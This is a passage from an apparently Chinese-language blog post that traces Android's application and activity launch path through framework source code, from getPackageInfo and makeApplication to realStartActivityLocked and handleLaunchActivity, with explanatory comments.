class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-function">LoadedApk <span class="hljs-title">getPackageInfoNoCheck</span><span class="hljs-params">(ApplicationInfo ai,</span></span><br><span class="hljs-params"><span class="hljs-function">            CompatibilityInfo compatInfo)</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">getPackageInfo</span><span class="hljs-params">(ai, compatInfo, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>, <span class="hljs-keyword">false</span>)</span></span>;<br>    &#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function">LoadedApk <span class="hljs-title">getPackageInfo</span><span class="hljs-params">(ApplicationInfo aInfo, CompatibilityInfo compatInfo,</span></span><br><span class="hljs-params"><span class="hljs-function">            ClassLoader baseLoader, <span class="hljs-keyword">boolean</span> securityViolation, <span class="hljs-keyword">boolean</span> includeCode,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-keyword">boolean</span> registerPackage)</span> </span>&#123;<br>         <span class="hljs-comment">//判断调用方和应用程序是不是同一个用户，如果不是，就不允许跨用户访问</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-keyword">boolean</span> differentUser = (UserHandle.myUserId() != UserHandle.getUserId(aInfo.uid));<br>        <span class="hljs-keyword">synchronized</span> (mResourcesManager) &#123;<br>            WeakReference&lt;LoadedApk&gt; ref;<br>            <span class="hljs-keyword">if</span> (differentUser) &#123;<br>                <span class="hljs-comment">// 不支持跨用户访问缓存</span><br>                ref = <span class="hljs-keyword">null</span>;<br>            &#125; <span class="hljs-function"><span class="hljs-keyword">else</span> <span class="hljs-title">if</span> <span class="hljs-params">(includeCode)</span> </span>&#123;<br>            <span class="hljs-comment">//进入到这个分支，根据应用包名从mPackages获取，也就是说每个app都会拥有唯一的LoadedApk对象</span><br>                ref = mPackages.get(aInfo.packageName);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ref = mResourcePackages.get(aInfo.packageName);<br>            &#125;<br><br>            LoadedApk packageInfo = ref != <span class="hljs-keyword">null</span> ? ref.get() : <span class="hljs-keyword">null</span>;<br>            <span class="hljs-comment">//刚进来这个为null</span><br>            <span class="hljs-keyword">if</span> (packageInfo == <span class="hljs-keyword">null</span> || (packageInfo.mResources != <span class="hljs-keyword">null</span><br>                    &amp;&amp; !packageInfo.mResources.getAssets().isUpToDate())) &#123;<br><br><span class="hljs-comment">//创建LoadedApk对象</span><br>                packageInfo = <span class="hljs-keyword">new</span> LoadedApk(<span class="hljs-keyword">this</span>, aInfo, compatInfo, baseLoader,<br>                            securityViolation, includeCode &amp;&amp;<br>                            (aInfo.flags&amp;ApplicationInfo.FLAG_HAS_CODE) != <span class="hljs-number">0</span>, registerPackage);<br><br>                <span class="hljs-keyword">if</span> (mSystemThread &amp;&amp; <span class="hljs-string">&quot;android&quot;</span>.equals(aInfo.packageName)) &#123;<br>                    packageInfo.installSystemApplicationInfo(aInfo,<br>                            getSystemContext().mPackageInfo.getClassLoader());<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (differentUser) &#123;<br>                    <span class="hljs-comment">// Caching not supported across users</span><br>                &#125; <span class="hljs-function"><span class="hljs-keyword">else</span> <span class="hljs-title">if</span> <span class="hljs-params">(includeCode)</span> </span>&#123;<br>                <span class="hljs-comment">//将新创建的LoadedApk加入到mPackages</span><br>                    mPackages.put(aInfo.packageName,<br>                            <span class="hljs-keyword">new</span> WeakReference&lt;LoadedApk&gt;(packageInfo));<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    mResourcePackages.put(aInfo.packageName,<br>                            <span class="hljs-keyword">new</span> WeakReference&lt;LoadedApk&gt;(packageInfo));<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> packageInfo;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里返回一个LoadedApk对象，这个对象有什么作用呢？</p><p>注意：LoadedApk对象是APK文件在内存中的表示，包含apk文件的相关信息，比如应用代码，资源文件，app里的activity和service等都可以从这获取，在使用类加载器的时候需要用到这个对象</p><h4 id="4-4-20-LoadedApk-makeApplication"><a href="#4-4-20-LoadedApk-makeApplication" class="headerlink" title="4.4.20  LoadedApk.makeApplication()"></a>4.4.20  LoadedApk.makeApplication()</h4><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> Application makeApplication(<span class="hljs-built_in">boolean</span> forceDefaultAppClass,<br>            Instrumentation instrumentation) &#123;<br>        <span class="hljs-keyword">if</span> (mApplication != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> mApplication;<br>        &#125;<br><br>        Application app = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">String</span> appClass = mApplicationInfo.className;<br>        <span class="hljs-keyword">if</span> (forceDefaultAppClass || (appClass == <span class="hljs-keyword">null</span>)) &#123;<br>            appClass = <span class="hljs-string">&quot;android.app.Application&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//类加载器</span><br>            java.lang.ClassLoader cl = getClassLoader();<br>            <span class="hljs-keyword">if</span> (!mPackageName.equals(<span class="hljs-string">&quot;android&quot;</span>)) &#123;<br>                initializeJavaContextClassLoader();<br>            &#125;<br>            <span class="hljs-comment">//创建ContextImpl，在组件中对Context的操作都会转移到这个类</span><br>            ContextImpl appContext = ContextImpl.createAppContext(mActivityThread, <span class="hljs-keyword">this</span>);<br>            <span class="hljs-comment">//创建Application</span><br>            app = mActivityThread.mInstrumentation.newApplication(<br>                    cl, appClass, appContext);<br>            appContext.setOuterContext(app);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">if</span> (!mActivityThread.mInstrumentation.onException(app, e)) &#123;<br>                Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(<br>                    <span class="hljs-string">&quot;Unable to instantiate application &quot;</span> + appClass<br>                    + <span class="hljs-string">&quot;: &quot;</span> + e.toString(), e);<br>            &#125;<br>        &#125;<br>        mActivityThread.mAllApplications.<span class="hljs-built_in">add</span>(app);<br>        <span class="hljs-comment">//给mApplication赋值</span><br>        mApplication = app;<br><br>        ......<br>        <br>        SparseArray&lt;<span class="hljs-keyword">String</span>&gt; packageIdentifiers = getAssets(mActivityThread)<br>            .getAssignedPackageIdentifiers();<br>    <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> N = packageIdentifiers.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> id = packageIdentifiers.keyAt(i);<br>        <span class="hljs-keyword">if</span> (id == <span class="hljs-number">0x01</span> || id == <span class="hljs-number">0x7f</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//重写所有apk库中的R常量</span><br>        rewriteRValues(getClassLoader(), packageIdentifiers.valueAt(i), id);<br>      &#125;<br><br>        <span class="hljs-keyword">return</span> app;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-21-Instrumentation-newApplication"><a href="#4-4-21-Instrumentation-newApplication" class="headerlink" title="4.4.21 Instrumentation.newApplication()"></a>4.4.21 Instrumentation.newApplication()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public Application <span class="hljs-keyword">new</span><span class="hljs-constructor">Application(ClassLoader <span class="hljs-params">cl</span>, String <span class="hljs-params">className</span>, Context <span class="hljs-params">context</span>)</span><br>            throws InstantiationException, IllegalAccessException, <br>            ClassNotFoundException &#123;<br>        return <span class="hljs-keyword">new</span><span class="hljs-constructor">Application(<span class="hljs-params">cl</span>.<span class="hljs-params">loadClass</span>(<span class="hljs-params">className</span>)</span>, context);<br>    &#125;<br>static public Application <span class="hljs-keyword">new</span><span class="hljs-constructor">Application(Class&lt;?&gt; <span class="hljs-params">clazz</span>, Context <span class="hljs-params">context</span>)</span><br>            throws InstantiationException, IllegalAccessException, <br>            ClassNotFoundException &#123;<br>        Application app = (Application)clazz.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>        app.attach(context);<br>        return app;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里通过反射实例化Application ，然后调用attach</p><h4 id="4-4-22-Application-attach"><a href="#4-4-22-Application-attach" class="headerlink" title="4.4.22 Application.attach()"></a>4.4.22 Application.attach()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">final void attach(Context context) &#123;<br><span class="hljs-comment">//给ContextWrapper对象中指定真正的Context（这里的Context实际类型是ContextImpl ）对象</span><br>        attach<span class="hljs-constructor">BaseContext(<span class="hljs-params">context</span>)</span>;<br>        mLoadedApk = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ContextImpl</span>.</span></span>get<span class="hljs-constructor">Impl(<span class="hljs-params">context</span>)</span>.mPackageInfo;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-23-ContextWrapper-attachBaseContext"><a href="#4-4-23-ContextWrapper-attachBaseContext" class="headerlink" title="4.4.23 ContextWrapper.attachBaseContext()"></a>4.4.23 ContextWrapper.attachBaseContext()</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">attachBaseContext</span>(<span class="hljs-params">Context <span class="hljs-keyword">base</span></span>)</span> &#123;<br>        <span class="hljs-keyword">if</span> (mBase != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">&quot;Base context already set&quot;</span>);<br>        &#125;<br>        mBase = <span class="hljs-keyword">base</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里对mBase 进行赋值，实际类型是ContextImpl</p><h4 id="4-4-24-Instrumentation-callApplicationOnCreate"><a href="#4-4-24-Instrumentation-callApplicationOnCreate" class="headerlink" title="4.4.24  Instrumentation.callApplicationOnCreate()"></a>4.4.24  Instrumentation.callApplicationOnCreate()</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">callApplicationOnCreate</span>(<span class="hljs-params">Application app</span>)</span> &#123;<br>        app.onCreate();<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-25-Application-onCreate"><a href="#4-4-25-Application-onCreate" class="headerlink" title="4.4.25 Application.onCreate()"></a>4.4.25 Application.onCreate()</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 在应用启动时调用 ，在创建任何activity, service,receiver，content providers之前调用</span><br><span class="hljs-comment">     * 在此方法里操作要尽可能快（比如状态的延迟初始化），因为在这里花费太长时间将会直接影响第一个</span><br><span class="hljs-comment">     * activity, service,receiver，content providers的性能</span><br><span class="hljs-comment">     * 如果重写这个方法，请务必调用super.onCreate（）</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@CallSuper</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">onCreate</span>(<span class="hljs-params"></span>)</span> &#123;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里就会回调Application的onCreate方法，我们通常会继承这个类，重写这个方法，做一些APP的初始化操作，但是切记不要做耗时复杂操作，因为这里应用才刚创建，还在初始化，可能会导致应用启动黑屏一段时间的情况</p><p>AMS.attachApplicationLocked方法执行完bindApplication后，对照着顶部目录看，接下来就是该方法第七步，启动Activity等操作了</p><h4 id="4-4-26-ActivityStackSupervisor-attachApplicationLocked"><a href="#4-4-26-ActivityStackSupervisor-attachApplicationLocked" class="headerlink" title="4.4.26 ActivityStackSupervisor.attachApplicationLocked()"></a>4.4.26 ActivityStackSupervisor.attachApplicationLocked()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">attachApplicationLocked</span><span class="hljs-params">(ProcessRecord app)</span> throws RemoteException </span>&#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> processName = app.processName;<br>        <span class="hljs-keyword">boolean</span> didSomething = <span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">//这里维护着这台设备上所有应用的activitystack，即app的任务栈</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> displayNdx = mActivityDisplays.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; displayNdx &gt;= <span class="hljs-number">0</span>; --displayNdx) &#123;<br>        <span class="hljs-comment">//取出其中一个任务栈</span><br>            ArrayList&lt;ActivityStack&gt; stacks = mActivityDisplays.<span class="hljs-built_in">valueAt</span>(displayNdx).mStacks;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> stackNdx = stacks.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; stackNdx &gt;= <span class="hljs-number">0</span>; --stackNdx) &#123;<br>                <span class="hljs-keyword">final</span> ActivityStack stack = stacks.<span class="hljs-built_in">get</span>(stackNdx);<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isFocusedStack</span>(stack)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-comment">//取出当前任务栈中处于栈顶且运行的activity</span><br>                ActivityRecord hr = stack.<span class="hljs-built_in">topRunningActivityLocked</span>();<br>                <span class="hljs-keyword">if</span> (hr != null) &#123;<br>                <span class="hljs-comment">//判断这个activity所在进程是否与当前调用的进程信息是否一致</span><br>                    <span class="hljs-keyword">if</span> (hr.app == null &amp;&amp; app.uid == hr.info.applicationInfo.uid<br>                            &amp;&amp; processName.<span class="hljs-built_in">equals</span>(hr.processName)) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//真正启动activity</span><br>                            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">realStartActivityLocked</span>(hr, app, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>)) &#123;<br>                                didSomething = <span class="hljs-literal">true</span>;<br>                            &#125;<br>                        &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (RemoteException e) &#123;<br>                            <span class="hljs-keyword">throw</span> e;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!didSomething) &#123;<br>        <span class="hljs-comment">//启动失败，需要确保一个可显示的activity</span><br>            <span class="hljs-built_in">ensureActivitiesVisibleLocked</span>(null, <span class="hljs-number">0</span>, !PRESERVE_WINDOWS);<br>        &#125;<br>        <span class="hljs-keyword">return</span> didSomething;<br>    &#125;<br></code></pre></td></tr></table></figure><p>接下来就要真正启动activity了，到这里也快接近尾声了</p><h4 id="4-4-27-ActivityStackSupervisor-realStartActivityLocked"><a href="#4-4-27-ActivityStackSupervisor-realStartActivityLocked" class="headerlink" title="4.4.27 ActivityStackSupervisor.realStartActivityLocked()"></a>4.4.27 ActivityStackSupervisor.realStartActivityLocked()</h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs lasso">final <span class="hljs-built_in">boolean</span> realStartActivityLocked(ActivityRecord r, ProcessRecord app,<br>            <span class="hljs-built_in">boolean</span> andResume, <span class="hljs-built_in">boolean</span> checkConfig) throws RemoteException &#123;<br><br><span class="hljs-comment">//如果activity正在pausing，那就跳过</span><br>        <span class="hljs-keyword">if</span> (!allPausedActivitiesComplete()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (andResume) &#123;<br>            r.startFreezingScreenLocked(app, <span class="hljs-number">0</span>);<br>            mWindowManager.setAppVisibility(r.appToken, <span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">// 启动ticks以收集有关慢速APP的信息。</span><br>            r.startLaunchTickingLocked();<br>        &#125;<br><br>        <span class="hljs-comment">// 让window manager根据新的activity顺序重新评估屏幕方向</span><br>        <span class="hljs-keyword">if</span> (checkConfig) &#123;<br>            Configuration config = mWindowManager.updateOrientationFromAppTokens(<br>                    mService.mConfiguration,<br>                    r.mayFreezeScreenLocked(app) ? r.appToken : <span class="hljs-built_in">null</span>);<br>            mService.updateConfigurationLocked(config, r, <span class="hljs-literal">false</span>);<br>        &#125;<br><br><span class="hljs-params">...</span><span class="hljs-params">...</span><br><br>        final ActivityStack <span class="hljs-built_in">stack</span> = task.<span class="hljs-built_in">stack</span>;<br>        try &#123;<br>            <span class="hljs-params">...</span><span class="hljs-params">...</span><br>            <br>            <span class="hljs-comment">//将该进程设置为前台进程PROCESS_STATE_TOP</span><br>            app.forceProcessStateUpTo(mService.mTopProcessState);<br>            <span class="hljs-comment">//启动activity</span><br>            app.<span class="hljs-keyword">thread</span>.scheduleLaunchActivity(<span class="hljs-literal">new</span> Intent(r.intent), r.appToken,<br>                    System.identityHashCode(r), r.info, <span class="hljs-literal">new</span> Configuration(mService.mConfiguration),<br>                    <span class="hljs-literal">new</span> Configuration(task.mOverrideConfig), r.compat, r.launchedFromPackage,<br>                    task.voiceInteractor, app.repProcState, r.icicle, r.persistentState, results,<br>                    newIntents, !andResume, mService.isNextTransitionForward(), profilerInfo);<br><br>            <span class="hljs-keyword">if</span> ((app.info.privateFlags&amp;ApplicationInfo.PRIVATE_FLAG_CANT_SAVE_STATE) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 处理heavy-weight process</span><br>                <span class="hljs-keyword">if</span> (app.processName.<span class="hljs-keyword">equals</span>(app.info.packageName)) &#123;<br>                    <span class="hljs-keyword">if</span> (mService.mHeavyWeightProcess != <span class="hljs-built_in">null</span><br>                            &amp;&amp; mService.mHeavyWeightProcess != app) &#123;<br>                        Slog.w(<span class="hljs-built_in">TAG</span>, <span class="hljs-string">&quot;Starting new heavy weight process &quot;</span> + app<br>                                + <span class="hljs-string">&quot; when already running &quot;</span><br>                                + mService.mHeavyWeightProcess);<br>                    &#125;<br>                    mService.mHeavyWeightProcess = app;<br>                    Message msg = mService.mHandler.obtainMessage(<br>                            ActivityManagerService.POST_HEAVY_NOTIFICATION_MSG);<br>                    msg.obj = r;<br>                    mService.mHandler.sendMessage(msg);<br>                &#125;<br>            &#125;<br><br>        &#125; catch (RemoteException e) &#123;<br>            <span class="hljs-keyword">if</span> (r.launchFailed) &#123;<br>                <span class="hljs-comment">// 第二次启动失败就放弃 并finish该activity</span><br>                mService.appDiedLocked(app);<br>                <span class="hljs-built_in">stack</span>.requestFinishActivityLocked(r.appToken, Activity.RESULT_CANCELED, <span class="hljs-built_in">null</span>,<br>                        <span class="hljs-string">&quot;2nd-crash&quot;</span>, <span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 第一次启动失败就重启该进程</span><br>            app.activities.remove(r);<br>            throw e;<br>        &#125;<br><br>        r.launchFailed = <span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">//将该进程加入到mLRUActivities队列顶部</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stack</span>.updateLRUListLocked(r)) &#123;<br>        &#125;<br><br><span class="hljs-params">...</span><span class="hljs-params">...</span><br><br>        <span class="hljs-comment">//更新所有与该Activity具有绑定关系的Service连接</span><br>        <span class="hljs-keyword">if</span> (r.app != <span class="hljs-built_in">null</span>) &#123;<br>            mService.mServices.updateServiceConnectionActivitiesLocked(r.app);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法里这最重要的一步就是app.thread.scheduleLaunchActivity，这里又是一个AIDL实现，app.thread的实际类型是客户端进程在AMS端进程的代理，即ATP；接下来具体过程跟上面分析thread.scheduleExit()的时候一样，这里就不在具体阐述了，直接到ActivityThread</p><h4 id="4-4-28-AT-handleLaunchActivity"><a href="#4-4-28-AT-handleLaunchActivity" class="headerlink" title="4.4.28 AT.handleLaunchActivity()"></a>4.4.28 AT.handleLaunchActivity()</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-keyword">private</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Handler</span> </span>&#123;<br>public void handleMessage(<span class="hljs-type">Message</span> msg) &#123;<br>            switch (msg.what) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-type">LAUNCH_ACTIVITY</span>: &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ActivityClientRecord</span> r = (<span class="hljs-type">ActivityClientRecord</span>) msg.obj;<br>                    <span class="hljs-comment">//获取LoadedApk对象</span><br>                    r.packageInfo = getPackageInfoNoCheck(<br>                            r.activityInfo.applicationInfo, r.compatInfo);<br>                    handleLaunchActivity(r, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;LAUNCH_ACTIVITY&quot;</span>);<br>                &#125; <span class="hljs-keyword">break</span>;<br>            &#125;<br>      &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> void handleLaunchActivity(<span class="hljs-type">ActivityClientRecord</span> r, <span class="hljs-type">Intent</span> customIntent, <span class="hljs-type">String</span> reason) &#123;<br><br>        unscheduleGcIdler();<br>        mSomeActivitiesChanged = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">if</span> (r.profilerInfo != <span class="hljs-literal">null</span>) &#123;<br>            mProfiler.setProfiler(r.profilerInfo);<br>            mProfiler.startProfiling();<br>        &#125;<br><br>        <span class="hljs-comment">//最终回调目标Activity的onConfigurationChanged()</span><br>        handleConfigurationChanged(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 在创建activity之前初始化wms</span><br>        <span class="hljs-type">WindowManagerGlobal</span>.initialize();<br><span class="hljs-comment">//最终回调目标Activity的onCreate</span><br>        <span class="hljs-type">Activity</span> a = performLaunchActivity(r, customIntent);<br><br>        <span class="hljs-keyword">if</span> (a != <span class="hljs-literal">null</span>) &#123;<br>            r.createdConfig = <span class="hljs-keyword">new</span> <span class="hljs-type">Configuration</span>(mConfiguration);<br>            reportSizeConfigurations(r);<br>            <span class="hljs-type">Bundle</span> oldState = r.state;<br>            <span class="hljs-comment">//最终回调目标Activity的onStart,onResume</span><br>            handleResumeActivity(r.token, <span class="hljs-literal">false</span>, r.isForward,<br>                    !r.activity.mFinished 